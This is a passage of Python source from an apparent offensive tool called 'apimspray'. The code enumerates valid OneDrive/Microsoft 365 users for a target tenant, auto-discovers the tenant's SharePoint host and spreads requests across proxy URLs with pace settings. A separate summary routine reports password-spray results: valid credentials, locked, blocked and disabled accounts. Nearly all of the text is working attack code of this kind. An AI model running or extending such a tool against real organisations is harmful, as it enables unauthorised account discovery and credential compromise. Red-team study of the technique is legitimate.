            proxy_urls = load_file_lines(args.aci_urls)

    tenant_name = None
    if not proxy_urls:
        if not args.tenant:
            print_error("--tenant is required when not using --aci-urls")
            sys.exit(1)
        try:
            sp_host = derive_sharepoint_host(args.tenant, args.domain)
            # Verify the derived host actually works
            ok, status = verify_tenant(sp_host)
            if ok:
                tenant_name = sp_host.split("-my.")[0]
            else:
                # Try auto-discovery
                discover_domain = args.domain or args.tenant
                if "." in discover_domain:
                    print_warn(f"{sp_host} not valid (HTTP {status or 'no response'}). Running auto-discovery...")
                    discovered_host, method = discover_sharepoint_host(discover_domain)
                    if discovered_host:
                        tenant_name = discovered_host.split("-my.")[0]
                        print_success(f"Discovered SharePoint tenant: {style(tenant_name, TermColors.GREEN, TermColors.BOLD)} (via {method})")
                    else:
                        print_error(f"Could not find a valid SharePoint host for {discover_domain}. "
                                    f"Use --tenant with the correct SharePoint subdomain.")
                        sys.exit(1)
                else:
                    print_error(f"Tenant verification failed for {sp_host} (HTTP {status or 'no response'}). "
                                f"Check the tenant name or pass a full domain for auto-discovery.")
                    sys.exit(1)
        except ValueError as e:
            print_error(str(e))
            sys.exit(1)

    # Apply --enum-pace template if set (overrides --threads and --timeout)
    threads = args.threads
    timeout = args.timeout
    pace_label = None
    if getattr(args, "enum_pace", None):
        ep = ENUM_PACE_SETTINGS[args.enum_pace]
        timeout = ep["timeout"]
        if proxy_urls:
            threads = len(proxy_urls) * ep["threads_per_proxy"]
        else:
            threads = ep["direct_threads"]
        pace_label = args.enum_pace

    logger = Logger(args.output)

    print_info(f"Starting apimspray")
    print_info(f"Mode: {style('enumerate', TermColors.MAGENTA, TermColors.BOLD)} (OneDrive User Enumeration)")
    if tenant_name:
        print_info(f"Tenant: {style(tenant_name, TermColors.CYAN, TermColors.BOLD)}")
    print_info(f"Candidate Users: {style(str(len(users)), TermColors.MAGENTA, TermColors.BOLD)}")
    pace_str = f" [{style(pace_label, TermColors.CYAN)}]" if pace_label else ""
    if proxy_urls:
        print_info(f"ACI Proxies: {style(str(len(proxy_urls)), TermColors.MAGENTA, TermColors.BOLD)} | Threads: {style(str(threads), TermColors.MAGENTA, TermColors.BOLD)} | Timeout: {style(str(timeout) + 's', TermColors.MAGENTA, TermColors.BOLD)}{pace_str}")
    else:
        print_info(f"No --aci-urls provided — going direct | Threads: {style(str(threads), TermColors.MAGENTA, TermColors.BOLD)} | Timeout: {style(str(timeout) + 's', TermColors.MAGENTA, TermColors.BOLD)}{pace_str}")

    enumerator = OneDriveEnumerator(proxy_urls, threads=threads, timeout=timeout, retries=args.retries, debug=args.verbose)
    valid_users, counters = enumerator.enumerate(users, tenant_name, logger)

    _print_enum_summary(logger, valid_users, users, counters)


def _print_enum_summary(logger, valid_users, all_users, counters):
    print("\n" + style("--- Enumeration Summary ---", TermColors.BOLD, TermColors.CYAN))
    print(f"Total Candidates:    {style(str(len(all_users)), TermColors.BOLD)}")
    print(f"Completed:           {style(str(counters['completed']), TermColors.BOLD)}")
    print(f"Valid Users Found:   {style(str(counters['valid']), TermColors.GREEN, TermColors.BOLD)}")
    print(f"Not Found:           {style(str(counters['not_found']), TermColors.DIM)}")
    print(f"Errors/Timeouts:     {style(str(counters['errors']), TermColors.YELLOW, TermColors.BOLD)}")
    coverage = (counters["completed"] / len(all_users) * 100) if all_users else 0
    print(f"Coverage:            {style(f'{coverage:.1f}%', TermColors.CYAN, TermColors.BOLD)}")
    print(f"Results Directory:   {style(str(logger.run_dir), TermColors.CYAN, TermColors.BOLD)}")
    if logger.files["enumerated"].exists():
        print(f"Valid Users File:    {style(str(logger.files['enumerated']), TermColors.GREEN)}")
    print(style("----------------------------", TermColors.BOLD, TermColors.CYAN))


def _print_summary(logger, locked_users, invalid_users, disabled_users=None):
    print("\n" + style("--- Assessment Summary ---", TermColors.BOLD, TermColors.CYAN))
    valid_count = sum(1 for _ in open(logger.files["valid"])) if logger.files["valid"].exists() else 0
    blocked_count = sum(1 for _ in open(logger.files["blocked"])) if logger.files["blocked"].exists() else 0
    failed_count = sum(1 for _ in open(logger.files["failed"])) if logger.files["failed"].exists() else 0
    total_attempts = valid_count + blocked_count + failed_count
    print(f"Total Attempts:      {style(str(total_attempts), TermColors.BOLD)}")
    print(f"Valid Credentials:   {style(str(valid_count), TermColors.GREEN, TermColors.BOLD)}")
    print(f"Locked/Blocked:      {style(str(blocked_count), TermColors.YELLOW, TermColors.BOLD)}")
    print(f"Failed Attempts:     {style(str(failed_count), TermColors.RED)}")
    print(f"Locked Users:        {style(str(len(locked_users)), TermColors.YELLOW)}")
    print(f"Users Not Found:     {style(str(len(invalid_users)), TermColors.YELLOW, TermColors.BOLD)}")
    if disabled_users:
        print(f"Disabled Accounts:   {style(str(len(disabled_users)), TermColors.YELLOW, TermColors.BOLD)} (removed from spray)")
    if invalid_users:
        for u in sorted(invalid_users):
            print(f"  {style('-', TermColors.DIM)} {u}")
    print(f"Results Directory:   {style(str(logger.run_dir), TermColors.CYAN, TermColors.BOLD)}")
    print(style("--------------------------", TermColors.BOLD, TermColors.CYAN))


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print_error("Interrupted by user")
        sys.exit(1)
